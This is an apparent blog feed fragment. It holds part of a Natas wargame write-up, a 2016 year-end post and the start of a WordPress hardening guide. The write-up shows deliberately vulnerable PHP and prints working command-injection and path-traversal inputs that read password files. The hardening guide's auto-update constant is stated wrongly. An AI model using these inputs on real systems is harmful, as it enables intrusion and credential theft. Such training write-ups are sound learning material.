+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$secret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;FOEIUWGHFEEUHOFUOIU&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now last thing is to enter the secret into the input form. &lt;/p&gt;
+&lt;p&gt;Great, it works!&lt;/p&gt;
+
+&lt;pre&gt;
+Access granted. The password for natas7 is ***********************
+&lt;/pre&gt;
+
+&lt;h1&gt;7&lt;/h1&gt;
+
+&lt;p&gt;In this level we have simple structure of the website - clicking the elements in the menu changes the content of the website. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.php?page=home&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Home&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.php?page=about&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;About&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+this is the about page
+
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Ok, we have this hint. Let's try to break this system and get access to /etc/natas_webpass/natas8&lt;/p&gt;
+
+&lt;p&gt;Actualy I didn't have to break it, simple entering this in URL like &lt;b&gt;index.php?page=/etc/natas_webpass/natas8&lt;/b&gt; allowed me to view the file. &lt;/p&gt;
+
+&lt;pre&gt;
+***********************
+&lt;/pre&gt;
+
+&lt;h1&gt;8&lt;/h1&gt;
+
+&lt;p&gt;Another level, another form.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$encodedSecret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;3d3d516343746d4d6d6c315669563362&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encodeSecret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin2hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strrev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodeSecret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'secret'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$encodedSecret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Access granted. The password for natas9 is &amp;lt;censored&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Wrong secret&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let's break down this process - firstly script takes input entered in form, then with function &lt;b&gt;encodeSecret&lt;/b&gt; it converts binary to hex, reverses this string and encodes with base64. What we have to do here is to reverse this process, which can be done with php. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@w3ndige ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;php -r &lt;span class=&quot;s1&quot;&gt;'echo base64_decode(strrev(hex2bin(&quot;3d3d516343746d4d6d6c315669563362&quot;)));'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This one liner produces the correct secret, which after entering into the form gives pass to the nex level. &lt;/p&gt;
+
+&lt;pre&gt;
+Access granted. The password for natas9 is ***********************
+&lt;/pre&gt;
+
+&lt;h1&gt;9&lt;/h1&gt;
+
+&lt;p&gt;This time we have something new - form searching in an dictionary. Let's check the source code. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;needle&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;needle&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;passthru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;grep -i &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; dictionary.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Actually, what this script does is very dangerous. We know that grep is command line function searching through the text files. But what, if we have entered semicolon and then another command? Acutally, you can see it working by entering &lt;b&gt;;ls- la&lt;/b&gt; in search form.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;-rw-r----- 1 natas9 natas9 460878 Jun 25  2016 dictionary.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, lets view the password by entering ;cat /etc/natas_webpass/natas10/, as it's also location of all passwords, which was stated in the beginning. &lt;/p&gt;
+
+&lt;pre&gt;
+Output:
+***********************
+
+African
+Africans
+Allah
+Allah's
+&lt;/pre&gt;
+
+&lt;p&gt;Let's move to the next one!&lt;/p&gt;
+
+&lt;h1&gt;10&lt;/h1&gt;
+
+&lt;p&gt;This time we have the updated version of the script from the last one, filtering for certain characters.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;lt;?
+&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;array_key_exists&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;needle&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;needle&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; !&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;preg_match&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/[;|&amp;amp;]/'&lt;/span&gt;,&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        print &lt;span class=&quot;s2&quot;&gt;&quot;Input contains an illegal character!&quot;&lt;/span&gt;;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        passthru&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;grep -i &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; dictionary.txt&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We have to find the way to execute this commands in a different way. And actually, after learning a lot about PHP I remembered that &lt;b&gt;.&lt;/b&gt; concatenates 2 strings. So let's do this: &lt;b&gt;. /etc/natas_webpass/natas11&lt;/b&gt;&lt;/p&gt;
+
+&lt;p&gt;Which actually produces the output! I tried to do this also with HTML entities firstly, but unfortunately it did not work out.  &lt;/p&gt;
+
+&lt;pre&gt;
+/etc/natas_webpass/natas11:***********************
+dictionary.txt:African
+dictionary.txt:Africans
+dictionary.txt:Allah
+dictionary.txt:Allah's
+&lt;/pre&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;And that's the point where I had to end this part of Natas exercises. I'll come back soon with another part, as they are really interesting and completely different from others at OverTheWire. &lt;/p&gt;
+
+&lt;p&gt;See you in the next one!&lt;/p&gt;
+
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">Summary of 2016</title><link href="http://localhost:4000/2016/12/14/what-has-happened/" rel="alternate" type="text/html" title="Summary of 2016" /><published>2016-12-14T01:00:00+01:00</published><updated>2016-12-14T01:00:00+01:00</updated><id>http://localhost:4000/2016/12/14/what-has-happened</id><content type="html" xml:base="http://localhost:4000/2016/12/14/what-has-happened/">&lt;h1&gt;Hey guys!&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;As 2016 is getting closer to the end, I wanted to give you some brief insight in what has been happening in the past month or so, with additional information about updates on RootNetSec and plans for the future. &lt;/p&gt;
+
+&lt;p&gt;Firstly I would like to apologize for the lack of the content, that unfortunately I couldn't deliver in the past month, because I'm in the last year of high school. Amount of studies that have been happening lately is insane, and I barely had any time to do any posts and projects. You can blame mathematics for this, as this is the most time consuming subject, but essential to get to the college. &lt;/p&gt;
+
+&lt;p&gt;Luckily Christmas break is coming, and I'm planning to write a few bigger posts in this period, definitely most of them security oriented, maybe a few about programming?&lt;/p&gt;
+
+&lt;p&gt;I also wanted to say big &lt;b&gt;THANK YOU&lt;/b&gt; for your support, for motivation that is making me learn more and more than ever. Without you this site wouldn't be the same! &lt;/p&gt;
+
+&lt;h1&gt;But what about these updates?&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Yeah, what about them? Last weeks I've been trying to improve design of some pages, making it a little bit more appealing and a little bit professional (still I don't know if this worked out), but I think that this form is the final look for now. Here is the list of improvements: &lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Improved &lt;b&gt;&lt;a href=&quot;http://rootnetsec.com/about/&quot;&gt;About&lt;/a&gt;&lt;/b&gt; page - visualisation of skills.&lt;/li&gt;
+&lt;li&gt;Improved &lt;b&gt;&lt;a href=&quot;http://rootnetsec.com/contact/&quot;&gt;Contact&lt;/a&gt;&lt;/b&gt; - different layout.&lt;/li&gt;
+&lt;li&gt;Improved &lt;b&gt;&lt;a href=&quot;http://rootnetsec.com/projects/&quot;&gt;Projects&lt;/a&gt;&lt;/b&gt; - completely redesigned.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Some of these changes are really small, unfortunately very visible, and essential for me. Sad life of  perfectionist :( &lt;/p&gt;
+
+&lt;p&gt;I've also created a server on Discord that you can find under this &lt;a href=&quot;https://discord.gg/BX8cWS6&quot;&gt;link&lt;/a&gt;. Idea behind it was to create a small group of security oriented students that want to learn together, have a little chat or exhange opinions on many different subjects. If you're interested, don't hesitate to join and see how will this work out for you. In addition you can shoot me a DM on Discord - it's the fastest way to get to me. &lt;/p&gt;
+
+&lt;p&gt;For those of you concerned about privacy I have joined &lt;a href=&quot;https://keybase.io/&quot;&gt;Keybase.io&lt;/a&gt; where you can know get my PGP key. It's great site and if you were thinking about joining I can undoubtedly recommend it to you! &lt;/p&gt;
+
+&lt;h1&gt;Summary of 2016&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Yeah, 2016 was hell of a year for me. I started this website not even thinking that it will last that long, but now I know that it was one of the greatest things that I could ever done to increase my knowledge. This year has also been one of the most intense years in my entire life. I have written 22 posts, all of them taking me about 7-9 hours to prepare, write and publish. Around 154 hours dedicated only to sharing what I have learned with you, which I found out - is also the greatest way to learn. By explaining to others.&lt;/p&gt;
+
+&lt;p&gt;From this point I also would like to say &lt;b&gt;THANK YOU&lt;/b&gt; addressed to my girlfriend - who has dedicated a lot of her time to correct my spelling mistakes, change the order of sentences to those making more sense and generaly helping me with the language. Without her, it would be very hard to read :D&lt;/p&gt;
+
+&lt;h1&gt;Last words&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;I'm right know in a process of working on a few projects - especially programming oriented but I'm also planning to  take up small research about malware, which I think I'll publish during the summer 2017, so there's definitely more content coming up - keep tuned. &lt;/p&gt;
+
+&lt;p&gt;If you came so far down, I wanted to say once again - thank you. And as always - stay safe, keep learning and I'll see you in a few weeks! &lt;/p&gt;
+
+&lt;p&gt;~ W3ndige&lt;/p&gt;</content><author><name>W3ndige</name></author><summary type="html">Hey guys!</summary></entry><entry><title type="html">Hardening WordPress</title><link href="http://localhost:4000/2016/12/04/hardening-wordpress/" rel="alternate" type="text/html" title="Hardening WordPress" /><published>2016-12-04T01:00:00+01:00</published><updated>2016-12-04T01:00:00+01:00</updated><id>http://localhost:4000/2016/12/04/hardening-wordpress</id><content type="html" xml:base="http://localhost:4000/2016/12/04/hardening-wordpress/">&lt;h1&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;WordPress is the most popular content management system (27.2% of all websites in 2016), bringing an ease in creating websites even for non technical users. Perfect option? Unfortunately not, as WordPress is also the most hacked platform (around 70% of all hacked CMS are WordPress based sites). &lt;/p&gt;
+
+&lt;p&gt;Is it because it's so popular? Maybe because many people don't have basic technical knowledge allowing to secure these platforms? Or because people create these websites and then forget about updating? I leave it to your answer. &lt;/p&gt;
+
+&lt;p&gt;Today we're going to focus on ways to secure your site, making it harder to get hacked. &lt;/p&gt;
+
+&lt;h1&gt;Keep your WordPress up to date&lt;/h1&gt;
+
+&lt;p&gt;First and the most important thing is to always keep your site updated, as well as plugins and themes that you're using as developers are working hard to secure all the reported flaws. A lot of sites were hacked by vulnerabilities in code of old plugins, or WordPress core, which were updated in the newer versions. &lt;/p&gt;
+
+&lt;p&gt;If you don't want to come back to your website as often, to only check for updates, consider auto update option. You can do this by using one of two methods - by defining constant in wp-config.php or by adding plugins. &lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;wp-config.php&lt;/b&gt;&lt;/p&gt;
+
+&lt;p&gt;To enable automatic updates define this constant: &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;define( 'AUTOMATIC_UPDATER_DISABLED', true );&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+&lt;li&gt;True – Development, minor, and major updates are all enabled&lt;/li&gt;
+&lt;li&gt;False – Development, minor, and major updates are all disabled&lt;/li&gt;
+&lt;li&gt;'minor' – Minor updates are enabled, development, and major updates are disabled&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;For plugins: &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;add_filter( 'auto_update_plugin', '__return_true' );&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;For themes: &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;add_filter( 'auto_update_theme', '__return_true' );&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1&gt;Use strong credentials!&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;b&gt;Strong passwords.&lt;/b&gt;&lt;/li&gt;
+&lt;li&gt;&lt;b&gt;Don't use admin as username.&lt;/b&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Not only people will try to attack your site. There are bots that will try to access your &lt;i&gt;wp-admin&lt;/i&gt; page and brute force your password, preferably using &lt;i&gt;admin&lt;/i&gt; as username. So it's essential to have strong password, but also by changing the username to something less obvious. That way attacker will also have to find it, along with the password.  &lt;/p&gt;
+
+&lt;p&gt;For passwords, I can reccomend generators from apps like KeePass or LastPass. Your password have to be &lt;b&gt;CLU&lt;/b&gt;: Complex. Long. Unique.&lt;/p&gt;
+
+&lt;p&gt;Another security practice is having two accounts - one working as admin and second for publication. Publication account should be used while adding blog posts, content that don't require admin privilages, and while using some public internet access. That way, even if somehow attacker gained access to your password, privilages of publication account won't allow him to do much more harm, than while being logged as admin. &lt;/p&gt;
+
+&lt;p&gt;Also - &lt;b&gt;consider two factor authentication!&lt;/b&gt;&lt;/p&gt;
+
+&lt;h1&gt;Think about your plugins!&lt;/h1&gt;
+
+&lt;p&gt;If you're not using a plugin, it's deactivated - simply, delete it. It's known to attack a site, by exploiting flaws in the plugin that the developer wasn't even using. But why it happens? After deactivating the plugin - its file are still in the WordPress directory waiting to be used once again. Or maybe waiting to be hacked? &lt;/p&gt;
+
+&lt;p&gt;Always download plugins from trustworthy sources. Even if you want a premium plugin, download them from sites like &lt;a href=&quot;https://themeforest.net/&quot;&gt;Themeforest&lt;/a&gt;, or from developer's website. Those free versions may be infected with malware or some backdoor that will make your site very easy to exploit. &lt;/p&gt;
+
+&lt;h1&gt;Hide your wp-config.php and .htaccess files&lt;/h1&gt;
+&lt;p&gt;The wp-config file contains very confidentional information about your website. To protect it from intrusion, you should add the following code to your .htaccess file to deny access to anyone else. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;Files wp-config.php&amp;gt;;
+order allow,deny
+deny from all
+&amp;lt;/Files&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Same for .htaccess file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;Files .htaccess&amp;gt;
+order allow,deny
+deny from all
+&amp;lt;/Files&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1&gt;Change your WordPress Security Keys&lt;/h1&gt;
+
+&lt;pre&gt;
+define('AUTH_KEY',         'VatTc3WfW~dKdE~m=Hf_bvaH-)1+ko=IQ:!oiYW}o1H+[;LgP[QC981U+{K2w0d+');
+define('SECURE_AUTH_KEY',  '/@*MX4vaG(:8iMfx(V z$-4b&amp;lt;N;_((cA `nv/~,*tKiO6W}hUf+ t]rL[I9,m^o|');
+define('LOGGED_IN_KEY',    'c$Ou*1`?^+(:I4=Lpy6aD-HMl/1Jdg9y-J$1^(V+o&amp;gt;{TyE[q.$)Rtvm:q5j_itG.');
+define('NONCE_KEY',        '=+2:9RPE=0x`9!/l}qaYQ`{m)OW|s2I&amp;amp;Hnk=O4/;gwh}I+WGJCk2PmHK{1CIjhDm');
+define('AUTH_SALT',        '$5a?Qk1Rzfd{+r_/9XR%2&amp;lt;P+f1^QlQ|pJXMX&amp;gt;1ly-8&amp;lt;n%1J#IaE+O9xy=8(x/AWU');
+define('SECURE_AUTH_SALT', 'iehUhOYms(1fQzpacQTrfUR?s;g&amp;gt;9-?(Q=H0s:p!7pT@xmAu/o&amp;gt;90MI2NE1-z-ji');
+define('LOGGED_IN_SALT',   '$.[D]&amp;lt;Nm)N[gig#&amp;lt;Dc8|&amp;gt;FXr&amp;amp;+QMmN{sv(AgHM.=*Fdnz-)1YTBAOuJIr94w0Mo3');
+define('NONCE_SALT',       'kkv&amp;lt;g?I-JZ+J%xdS!~9vr&amp;gt;F4myL7hdgl++7Q|)I|,=^Jvh=8Ty-iiarrzK)P-sn|');
+&lt;/pre&gt;
+
+&lt;p&gt;WordPress Security Keys is a set of random variables that improve encryption of information stored in the user’s cookies. You should change them right after installation of your WordPress site. Use &lt;a href=&quot;https://api.wordpress.org/secret-key/1.1/salt&quot;&gt;this&lt;/a&gt; site to get new set of fresh keys and then change them in you wp-config.php file.  &lt;/p&gt;
+
+&lt;h1&gt;Change file permissions&lt;/h1&gt;
+
+&lt;p&gt;Having secure file permissions may vary from your hosting provider, some may have secure permissions to your files, and some won't bother about this leaving you with default settings. Avoid having directories with 777 permissions, instead opt for 755 or 750. Also set files to 640 or 644 and wp-config.php to 600.&lt;/p&gt;
+
+&lt;h1&gt;Limit login attempts&lt;/h1&gt;
+
+&lt;p&gt;As I mentioned before, many attackers try to gain access with automated brute force attacks. Easiest way would be to use plugin that will forbid certain IP address from accessing the wp-admin page after certain amounts of failed logins. Plugin such as &lt;a href=&quot;https://wordpress.org/plugins/all-in-one-wp-security-and-firewall/&quot;&gt;All In One WP Security &amp;amp; Firewall&lt;/a&gt; will allow you to change the URL of the login page - bots are programmed to look for wp-admin. &lt;/p&gt;
+
+&lt;p&gt;In addition to that use plugin limiting login attempts: &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://wordpress.org/plugins/limit-login-attempts-reloaded/&quot;&gt;Limit Login Attempts Reloaded&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://wordpress.org/plugins/login-lockdown/&quot;&gt;Login Lockdown&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1&gt;Hide your WordPress version&lt;/h1&gt;
+
+&lt;p&gt;FIngerprinting WordPress is a huge issue, since from the attacker point of view - knowing the version will make it easier to find exploits. You can do this by adding this piece of code to your functions.php file. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* Hide WP version strings from scripts and styles
+ * @return {string} $src
+ * @filter script_loader_src
+ * @filter style_loader_src
+ */&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fjarrett_remove_wp_version_strings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$src&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
